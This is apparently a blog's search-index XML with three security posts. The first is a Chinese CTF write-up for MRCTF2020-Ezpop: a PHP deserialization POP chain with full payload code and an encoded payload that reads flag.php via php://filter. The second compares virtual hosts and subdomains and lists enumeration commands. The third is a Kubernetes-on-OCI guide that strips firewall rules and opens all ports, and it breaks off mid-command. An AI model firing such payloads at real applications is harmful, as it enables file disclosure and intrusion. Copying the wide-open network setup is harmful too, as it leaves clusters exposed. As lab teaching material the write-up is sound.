<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP反序列化之POP链学习 - MRCTF2020-Ezpop</title>
      <link href="/2025/02/08/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPOP%E9%93%BE%E5%AD%A6%E4%B9%A0-MRCTF2020-Ezpop/"/>
      <url>/2025/02/08/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPOP%E9%93%BE%E5%AD%A6%E4%B9%A0-MRCTF2020-Ezpop/</url>
      
        <content type="html"><![CDATA[<p>本文以MRCTF2020-Ezpop这一CTF题目为例，详细记录了我在探索PHP POP链反序列化过程中的学习与实践经历，从题目分析、漏洞挖掘到技术实现，旨在提供实战参考与启发。</p><h1>MRCTF2020-Ezpop 题目分析</h1><h2 id="源码">源码</h2><div class="tabs my-3">        <ul class="mx-0 my-0">            <li class="is-active">          <a href="#index.php">              <span class="icon is-small ml-0">                <i class="fa-brands fa-php" aria-hidden="true"></i>            </span>index.php          </a>      </li><li>          <a href="#flag.php">              <span class="icon is-small ml-0">                <i class="fa-brands fa-php" aria-hidden="true"></i>            </span>index.php          </a>      </li>        </ul>    </div>    <div id="index.php" class="tab-content">          <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>      </div><div id="flag.php" class="tab-content is-hidden">          <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span> = <span class="string">&quot;flag&#123;this_is_a_flag&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Help Me Find FLAG!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>      </div><h1>构造 PHP POP 链的过程</h1><h2 id="思路与原理">思路与原理</h2><p>根据最后执行的语句来看</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>if</code> 判断语句中，需要从 <code>pop</code> 参数中拿去序列化字符串后进行反序列化操作。如果没有 <code>pop</code> 参数则直接生成 <code>Show</code> 这个类，然后将当前 PHP 文件直接以彩色格式打印出来。</p><p>那么很明显，我们唯一可以利用的就是反序列化了。接下来我们来分析下源码：</p><ol><li><code>Modifier</code> 类<ol><li>这个类有 <code>var</code> 属性是我们可以控制的。</li><li>这个类有一个 <code>__invoke()</code> 魔术方法，需要当对象被当作函数调用的时候才能触发。</li><li>这个 <code>__invoke()</code> 魔术方法中调用了 <code>append()</code> 这个方法，并将 <code>var</code> 属性的值传入进去。</li><li><code>append()</code> 方法中又包含了一个 <code>include()</code> 方法。</li><li>所以最后 <code>var</code> 属性的值被 <code>include()</code> 方法给包含了。</li><li>综上所述，如果能触发 <code>__invoke()</code> 魔术方法、并控制 <code>var</code> 属性的值，则可以实现文件包含。</li></ol></li><li><code>Show</code> 类<ol><li>这个类有 <code>source</code>、<code>str</code> 属性是我们可以控制的。</li><li>这个类有一个 <code>__construct()</code> 魔术方法，需要当对象被创建时才能触发。</li><li>这个 <code>__construct()</code> 魔术方法将 <code>index.php</code> 这个值保存在 <code>source</code> 属性中，并打印出 <code>Welcome to index.php</code>。</li><li>这个类有一个 <code>__toString()</code> 魔术方法，需要当对象被当作字符串的时候才能触发。</li><li>这个 <code>__toString()</code> 魔术方法中返回了 <code>$this-&gt;str-&gt;source</code>，假设 <code>$this-&gt;str</code> 是另一个类的实例，当访问 <code>source</code> 属性的时候，如果该属性不存在，则会触发 <code>__get()</code> 魔术方法。</li><li>这个类有一个 <code>__wakeup()</code> 魔术方法，需要在反序列化时触发。</li><li>这个 <code>__wakeup()</code> 魔术方法中首先检查 <code>source</code> 属性是否包含一些危险的协议（在检查的过程中，会触发 <code>__toString()</code> 魔术方法，当然这里需要是对象被当作字符串使用才行）。如果存在，则打印 <code>hacker</code>，并将 <code>index.php</code> 这个值保存在 <code>source</code> 属性中。不过黑名单的方式总是可以绕过的。</li></ol></li><li><code>Test</code> 类<ol><li>这个类有 <code>p</code> 属性是我们可以控制的。</li><li>这个类有一个 <code>__construct()</code> 魔术方法，需要当对象被创建时才能触发。</li><li>这个 <code>__construct()</code> 魔术方法将 <code>p</code> 属性初始化为一个空数组。</li><li>这个类有一个 <code>__get()</code> 魔术方法，需要当访问不可访问的属性（<code>protected</code> 或 <code>private</code>)或不存在的属性的时候才能触发。</li><li>这个 <code>__get()</code> 魔术方法将 <code>p</code> 属性的值保存在 <code>function</code> 属性中，并把 <code>function</code> 属性作为函数返回。这时，联系到 <code>Modifier</code> 类，如果 <code>p</code> 属性是 <code>Modifier</code> 类的实例，那么将对象作为函数调用返回，就会触发 <code>Modifer</code> 类中的<code>__invoke()</code> 魔术方法。</li></ol></li></ol><p>这就是对整个代码的解读，这时候就需要将POP链串起来了：</p><ol><li>首先在 <code>if</code> 判断语句中，反序列化会调用 <code>Show</code> 类中的 <code>__wakeup()</code> 魔术方法。</li><li>接着在 <code>__wakeup()</code> 魔术方法中 <code>$this-&gt;source</code> 属性作为 <code>Show</code> 的另一个实例触发了 <code>Show</code> 中的 <code>__toString()</code> 魔术方法。</li><li><code>__toString()</code> 魔术方法中 <code>$this-&gt;str</code> 属性如果是 <code>Test</code> 类，调用 <code>source</code> 这个不存在的属性的时候就会触发 <code>__get()</code> 魔术方法。<code>$this-&gt;str</code> 属性肯定不能是 <code>Modifier</code> 类，因为 <code>Modifier</code> 类中没有 <code>__get()</code> 魔术方法用来触发。</li><li>在 <code>__get()</code> 魔术方法中将 <code>Modifer</code> 类实例作为 <code>$this-&gt;p</code> 放在 <code>function</code> 属性中，当作函数调用，触发 <code>Modifier</code> 类中的 <code>__invoke()</code> 魔术方法后使用 <code>append()</code> 方法包含 <code>var</code> 属性中的文件。</li><li>最后只需要将文件路径传入我们可以控制的属性 <code>var</code> 即可。</li></ol><p>最后 POP 链如下：<code>Show::__wakup() &gt; Show::__toString() &gt; Test::__get() &gt; Modifier::__invoke() &gt; Modifier::append &gt; include</code></p><h2 id="具体步骤">具体步骤</h2><p>做这种反序列化题，首先我们把可控的类、属性等拷贝到新的文件 <code>payload.php</code>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>; <span class="comment">// 目标文件</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据POP利用链初始化类：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br></pre></td></tr></table></figure><p>将它们串起来：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>-&gt;source = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;str = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;p = <span class="variable">$d</span>;</span><br></pre></td></tr></table></figure><p>最后因为是打算在浏览器中发送序列化后的字符串，以 <code>urlencode()</code> 方式打印出这些字符串：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>最终的 Payload 为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;str = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;p = <span class="variable">$d</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h1>漏洞利用演示与结果</h1><h2 id="利用流程展示">利用流程展示</h2><p>执行 <code>payload.php</code> 生成 Payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><p>发送请求包：</p><p><img src="request.png" alt=""></p><p>得到返回的 Base64 编码后的结果。</p><h2 id="攻击结果">攻击结果</h2><p>将 Base64 编码后的内容解码后得到 Flag：</p><p><img src="flag.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> Web安全 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> POP链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A Comprehensive Comparison Between Virtual Hosts and Subdomains</title>
      <link href="/2024/08/09/A-Comprehensive-Comparison-Between-Virtual-Hosts-and-Subdomains/"/>
      <url>/2024/08/09/A-Comprehensive-Comparison-Between-Virtual-Hosts-and-Subdomains/</url>
      
        <content type="html"><![CDATA[<h1>Virtual Hosts</h1><p>Virtual hosts are websites running on multiple domains on the same physical server, and these units are independent of each other. They can have their own separate domain names, IP addresses, and website content, but they share the same server and operating system, as shown below:</p><p><img src="https://cdn.jsdelivr.net/gh/ikelvinwoo/images@master/uPic/20240809093746-O0gDfl.png" alt="Architecture of Virtual Hosts"></p><p>Web users can access a specific website by domain name, IP address, or port, as shown in the figure below:</p><p><img src="https://cdn.jsdelivr.net/gh/ikelvinwoo/images@master/uPic/20240809093810-h1WRnT.png" alt="Virtual Host Access Traffic Flows"></p><p><strong>Virtual hosts are typically used in the following scenarios:</strong></p><ul><li>Hosting multiple websites with different domain names on a single server;</li><li>Saving server resources and costs.</li></ul><h2 id="Types">Types</h2><p>There are 3 types of virtual hosts: 1) URL-based; 2) IP address-based; and 3) port-based, as shown in the table below:</p><table><thead><tr><th></th><th>URL-Based</th><th>IP Address-Based</th><th>Port-Based</th></tr></thead><tbody><tr><td><strong>Depending on Host Header</strong></td><td>Yes</td><td>No</td><td>Yes - URL Used<br />No - IP Addresses Used</td></tr><tr><td><strong>Multi IP Address Requirements</strong></td><td>No</td><td>Yes</td><td>No - URL Used<br />Yes - IP Addresses Used</td></tr><tr><td><strong>SSL/TLS Protocol Limitation</strong></td><td>Yes</td><td>No</td><td>Yes - URL Used<br />No - IP Addresses Used</td></tr><tr><td><strong>Efficiency</strong></td><td>High</td><td>Medium</td><td>Medium</td></tr><tr><td><strong>Flexibility</strong></td><td>High</td><td>Medium</td><td>Medium</td></tr><tr><td><strong>Usability</strong></td><td>High</td><td>Low</td><td>Medium</td></tr><tr><td><strong>Security</strong></td><td>Medium</td><td>High</td><td>Medium - URL Used<br />High - IP Addresses Used</td></tr></tbody></table><h2 id="DNS-Resolution">DNS Resolution</h2><p>Virtual hosting is implemented at the configuration level of a web server and allows multiple websites to be hosted on a single server. In the DNS resolution process, each virtual host usually corresponds to one or more domain names, and the DNS server resolves these domain names to point to the server with the same IP address. After receiving a HTTP request, the web server decides which virtual host’s content and resources to respond to the user based on the Host header in the request packet.</p><p>However, public DNS usually cannot resolve some virtual hosts, mainly because public DNS does not have the correct A record, AAAA record, or CNAME record, and these virtual hosts share the same IP address and run on the same physical machine. In this case, the only way to distinguish between different websites is through the Host header information in the HTTP request. If you need to access these virtual hosts in a browser, one way to achieve this is to manually add DNS resolution records in the <code>/etc/host</code> file (Linux) or in the <code>C:\Windows\System32\drivers\etc\hosts</code> file (Windows).</p><h2 id="Potential-Security-Concerns">Potential Security Concerns</h2><p><strong>Misconfiguration</strong></p><p>Misconfigured virtual hosts can cause websites with different domain names to leak each other’s sensitive information.</p><p>As an example, let’s say there is a web server with a public IP of <code>1.1.1.1</code> and hosting two websites <code>example.com</code> and <code>a.example.com</code>. Failure to properly distinguish between the directories corresponding to the two domains may result in <code>a.example.com</code> being accessed with the contents of <code>example.com</code>, or <code>a.example.com</code> being accessed with the contents of <code>example.com</code>.</p><p><strong>Access Control Concerns</strong></p><p>There may be access controls that are not properly configured, allowing unauthorized access to the contents of the virtual host.</p><p>In Apache, access control is usually configured 1) globally in the <code>httpd.conf</code> file, and 2) specifically in the configuration file corresponding to each virtual host (e.g., in the directory <code>/etc/apache2/sites-available</code>). The following are some of the settings in the virtual host configuration, where <code>Order</code>, <code>Allow</code>, <code>Deny</code>, etc. define the access control rules for the virtual host.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName example.com</span><br><span class="line">    DocumentRoot /var/www/example</span><br><span class="line">    &lt;Directory /var/www/example&gt;</span><br><span class="line">        Options Indexes FollowSymLinks</span><br><span class="line">        AllowOverride None</span><br><span class="line">        Order allow,deny</span><br><span class="line">        Allow from all</span><br><span class="line">    &lt;/Directory&gt;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><p>In Nginx, similar to Apache, global configuration can be configured in the <code>nginx.conf</code> file, and a separate virtual host configuration file is located in the <code>/etc/nginx/sites-available</code> directory. As follows, the <code>allow</code> parameter in the <code>location</code> block defines the access control rules for the virtual host.</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> example.com;</span><br><span class="line">    <span class="attribute">root</span> /var/www/example;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">allow</span> all;</span><br><span class="line">        <span class="comment"># Other directives</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Therefore, the following considerations need to be taken into account in the access control definitions:</p><ol><li>Determine access requirements based on the business context and limit access to IP addresses with <code>Allow</code> and <code>Deny</code> parameters;</li><li>Authentication mechanisms can be integrated into security controls if needed;</li><li>Logging would need to be enabled to ensure that exceptions can be logged and regular log reviews are performed.</li></ol><h2 id="Virtual-Host-Enumeration">Virtual Host Enumeration</h2><p>In general, URL-based virtual host is one of the most common practices, and we can use different tools for virtual host enumeration:</p><ul><li><a href="https://github.com/OJ/gobuster">Gobuster</a>: <code>gobuster vhost -u http(s)://&lt;TARGET&gt; -w &lt;WORDLIST_FILE&gt; --append-domain</code></li><li><a href="https://github.com/ffuf/ffuf">Ffuf</a>: <code>ffuf -w &lt;WORDLIST_FILE&gt;:FUZZ -u http(s)://&lt;TARGET&gt; -H 'Host: FUZZ.&lt;TARGET&gt;'</code></li><li><a href="https://nmap.org/">Nmap</a>: <code>nmap -p &lt;PORT&gt; --script http-vhosts &lt;TARGET&gt;</code></li><li><a href="https://github.com/sullo/nikto">Nikto</a>: <code>nikto -h &lt;TARGET_IP&gt; -p &lt;PORT&gt; -vhost &lt;TARGET_URL&gt;</code></li></ul><h1>Subdomains</h1><p>After discussing virtual hosts, there is no mandatory requirement for subdomains to share the same server and operating system as virtual hosts do. Subdomains are subdivisions of the main domain name and are often used to distinguish between different services, departments, or geographic locations. Subdomains can be set up with DNS records (such as A records, AAAA records, or CNAME records), which can point to different IP addresses or different ports on the same IP address.</p><p><img src="https://cdn.jsdelivr.net/gh/ikelvinwoo/images@master/uPic/20240809094006-6qc00U.png" alt="Architecture of Subdomains"></p><p><strong>Subdomains are typically used in the following scenarios:</strong></p><ul><li>Separating different services or departments under the main domain name;</li><li>Providing different websites or services without the need for additional domain names.</li></ul><h2 id="DNS-Resolution-2">DNS Resolution</h2><p>A subdomain is a branch under the main domain name, which is usually used to separate different services, departments, or geographical locations under the main domain name. In public DNS, subdomains are usually available for resolution (i.e., A records, AAAA records, or CNAME records can be found.) In the DNS resolution process, the browser will find the corresponding IP address based on the DNS record, and then sends requests to that IP address.</p><h2 id="Potential-Security-Concerns-2">Potential Security Concerns</h2><ul><li><strong>Unauthorized Access</strong>: Some subdomains may not be properly protected, which may result in the disclosure of sensitive information or unauthorized access.</li><li><strong>Subdomain Hijacking</strong>: If an attacker is able to tamper with DNS records or use DNS cache poisoning attacks, they are able to hijack subdomain traffic and perform malicious actions such as man-in-the-middle (MITM) attacks or stealing sensitive information.</li></ul><h2 id="Subdomain-Enumerations">Subdomain Enumerations</h2><p>There are different tools we can use to enumerate subdomains:</p><ul><li><a href="https://github.com/fwaeytens/dnsenum">DNSEnum</a>: <code>dnsenum --enum &lt;TARGET&gt; -f &lt;WORDLIST_FILE&gt; -r</code></li><li><a href="https://github.com/ffuf/ffuf">Ffuf</a>: <code>ffuf -w &lt;WORDLIST_FILE&gt;:FUZZ -u http(s)://FUZZ.&lt;TARGET&gt;</code></li><li><a href="https://github.com/owasp-amass/amass">Amass</a>: <code>amass enum -d &lt;TARGET&gt;</code></li><li><a href="https://github.com/tomnomnom/assetfinder">Assetfinder</a>: <code>assetfinder --subs-only &lt;TARGET&gt;</code></li><li><a href="https://github.com/darkoperator/dnsrecon">DNSRecon</a>: <code>dnsrecon -d &lt;TARGET&gt;</code></li><li>DIG Zone Transfer: <code>dig axfr @&lt;NS_ADDRESS&gt; &lt;TARGET&gt;</code></li></ul><h1>Conclusion</h1><p>By learning about virtual hosts and subdomains, I have learnt that virtual hosts are a special type of subdomain. <strong>Virtual hosts</strong> require sharing the same server and operating system, and some domain names for virtual hosts are not resolvable in the public DNS. On the other hand, <strong>subdomains</strong> are able to get domain names resolved in public DNS easily.</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> Web安全 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟主机 </tag>
            
            <tag> 子域名 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Implementing Kubernetes and Docker on OCI</title>
      <link href="/2022/04/27/Implementing-Kubernetes-and-Docker-on-OCI/"/>
      <url>/2022/04/27/Implementing-Kubernetes-and-Docker-on-OCI/</url>
      
        <content type="html"><![CDATA[<h1>Introduction</h1><p>This was an assignment for Cloud Security class in semester 1, 2022. The requirements asked me to pack a web application into Docker and then deploy the service on the cloud using Kubernetes. The entire lab environment was built on OCI (Oracle Cloud Infrastructure). Here are my configuration notes and the pitfalls I stepped through to help take the easy way out when deploying services to OCI in the future.</p><p>This diary focuses on the deployment phase. Since OCI has some pre-defined iptables rules that can block communications between nodes, security lists also affect internal communication between VMs, even if they are in the same subnet. I needed to modify the iptables and security lists as below:</p><h1>Pre-Configuration</h1><h2 id="iptables-controller-nodes">iptables (controller &amp; nodes)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## save existing rules</span><br><span class="line">sudo iptables-save &gt; ~/iptables-rules</span><br><span class="line"></span><br><span class="line">## modify rules, remove drop and reject lines</span><br><span class="line">grep -v &quot;DROP&quot; iptables-rules &gt; tmpfile &amp;&amp; mv tmpfile iptables-rules-mod</span><br><span class="line">grep -v &quot;REJECT&quot; iptables-rules-mod &gt; tmpfile &amp;&amp; mv tmpfile iptables-rules-mod</span><br><span class="line"></span><br><span class="line">## apply the modifications</span><br><span class="line">sudo iptables-restore &lt; ~/iwptables-rules-mod</span><br><span class="line"></span><br><span class="line">## check</span><br><span class="line">sudo iptables -L</span><br><span class="line"></span><br><span class="line">## save the changes</span><br><span class="line">sudo netfilter-persistent save</span><br><span class="line">sudo systemctl restart iptables</span><br><span class="line"></span><br><span class="line">## letting iptables see bridged traffic</span><br><span class="line">cat &lt;&lt;EOF | sudo tee /etc/modules-load.d/k8s.conf</span><br><span class="line">br_netfilter</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &lt;&lt;EOF | sudo tee /etc/sysctl.d/k8s.conf</span><br><span class="line">net.bridge.bridge-nf-call-ip6tables = 1</span><br><span class="line">net.bridge.bridge-nf-call-iptables = 1</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">sudo sysctl --system</span><br></pre></td></tr></table></figure><h2 id="Security-Lists">Security Lists</h2><p>For easy configuration, I opened everything, so security lists ended up with only three rules:</p><ul><li><code>0.0.0.0/0; TCP; All ports</code></li><li><code>0.0.0.0/0; UDP; All ports</code></li><li><code>0.0.0.0/0; ICMP</code></li></ul><p>But make sure that you refer to <a href="https://kubernetes.io/docs/reference/ports-and-protocols/">Kubernetes documentation</a> and related CNI documentation to narrow down the open ports and IP ranges after implementation.</p><h1>Configuration</h1><p>After the pre-configuration part, we can start installing Kubernetes and Docker on all the VMs.</p><h2 id="System-updates-controller-nodes">System updates (controller &amp; nodes)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><h2 id="Docker-controller-nodes">Docker (controller &amp; nodes)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt -y install docker.io</span><br><span class="line">sudo nano /etc/docker/daemon.json</span><br></pre></td></tr></table></figure><p>In <code>daemon.json</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Then run</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><p>To check if Cgroup is <code>systemd</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker info | grep group</span><br></pre></td></tr></table></figure><h2 id="K8S-Installation-controller-nodes">K8S Installation (controller &amp; nodes)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -s &lt;https://packages.cloud.google.com/apt/doc/apt-key.gpg&gt; | sudo apt-key add</span><br><span class="line">sudo apt-add-repository &quot;deb &lt;http://apt.kubernetes.io/&gt; kubernetes-xenial main&quot;</span><br><span class="line">sudo apt-get -y install kubeadm kubelet kubectl</span><br><span class="line">sudo apt-mark hold kubeadm kubelet kubectl</span><br></pre></td></tr></table></figure><h1>Post-Configuration</h1><h2 id="K8S-init-controller">K8S init (controller)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo kubeadm init --pod-network-cidr=[CNI required range] --apiserver-advertise-address=[local IP address]</span><br><span class="line">mkdir -p $HOME/.kube</span><br><span class="line">sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">sudo chown 